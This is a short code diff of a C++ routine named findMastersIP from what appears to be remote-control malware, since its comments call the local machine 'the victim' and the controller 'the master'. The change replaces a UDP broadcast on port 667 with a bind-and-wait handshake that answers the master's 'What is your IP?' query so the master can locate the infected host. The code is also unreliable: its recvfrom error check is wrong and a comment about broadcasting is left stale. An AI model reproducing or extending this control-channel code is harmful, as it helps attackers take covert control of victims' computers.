@@ -18,26 +18,31 @@ uint32_t findMastersIP()
     char* buf = new char[65536];
     int fromlen = sizeof(mastersinfo);
 
-    /*the victim will broadcast to port 667 that he needs the master's ip*/
-    sockinfo.sin_addr.s_addr = inet_addr("255.255.255.255");
+    sockinfo.sin_addr.s_addr = inet_addr("0.0.0.0");
     sockinfo.sin_port = htons(667);
     sockinfo.sin_family = AF_INET;
 
-    mastersinfo.sin_addr.s_addr = 0;
+    bind(s, (sockaddr*)&sockinfo, sizeof sockinfo);
 
     /*fixed messages for my "protocol"*/
-    message = "Hello, how's your day?";
-    response = "Oh I'm great";
+    message = "What is your IP?";
+    response = "My IP";
 
-    error = sendto(s, message.c_str(), message.size(), 0, (sockaddr*)&sockinfo, sizeof(sockinfo));
-    if (!error)
-        goto errorLable;
-    
-    do{
+    /*wait for the master to ask me to connect*/
+    do {
         error = recvfrom(s, buf, 65536, 0, (sockaddr*)&mastersinfo, &fromlen);
         if (!error)
-            break;
-    } while (!std::string(buf)._Equal(response));
+            goto errorLable;
+    } while (!std::string(buf)._Equal(message));
+
+    /*the victim will broadcast to port 667 that he needs the master's ip*/
+    sockinfo.sin_addr.s_addr = mastersinfo.sin_addr.s_addr;
+    sockinfo.sin_port = mastersinfo.sin_port;
+    sockinfo.sin_family = mastersinfo.sin_family;
+
+    sendto(s, response.c_str(), response.size(), 0, (sockaddr*)&sockinfo, sizeof(sockinfo));
+    
+
 errorLable:
     delete[] buf;
     closesocket(s);
